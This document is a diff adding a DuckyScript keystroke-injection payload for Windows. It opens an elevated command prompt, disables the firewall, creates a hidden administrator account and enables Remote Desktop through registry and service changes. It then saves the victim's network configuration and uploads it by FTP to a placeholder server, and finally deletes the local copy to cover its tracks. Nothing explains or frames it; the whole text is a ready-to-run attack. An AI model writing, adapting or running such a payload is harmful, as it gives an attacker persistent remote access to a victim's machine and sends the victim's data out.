@@ -1,0 +1,64 @@
+DELAY 2000
+ESCAPE
+CONTROL ESCAPE
+DELAY 400
+STRING cmd
+DELAY 400
+CTRL-SHIFT ENTER
+DELAY 400
+STRING netsh firewall set opmode mode=disable
+ENTER
+DELAY 400
+STRING ALT y
+ENTER
+DELAY 400
+STRING net user /add username password
+ENTER
+DELAY 400
+STRING net localgroup administrators username /add
+ENTER
+DELAY 400
+STRING reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
+ENTER
+DELAY 400
+STRING reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
+ENTER
+DELAY 400
+STRING sc config TermService start= auto
+ENTER
+DELAY 400
+STRING net start Termservice
+ENTER
+DELAY 400
+STRING cd %USERPROFILE%
+ENTER
+DELAY 400
+STRING ipconfig /all > number.txt
+ENTER
+DELAY 400
+STRING ftp -i ftp server
+ENTER
+DELAY 400
+STRING login name
+ENTER
+DELAY 400
+STRING login password
+ENTER
+DELAY 600
+STRING prompt
+ENTER
+DELAY 400
+STRING prompt
+ENTER
+DELAY 400
+STRING PUT number.txt
+ENTER
+DELAY 2000
+STRING bye
+ENTER
+DELAY 400
+STRING del number.txt
+ENTER
+DELAY 400
+ALT SPACE
+STRING c
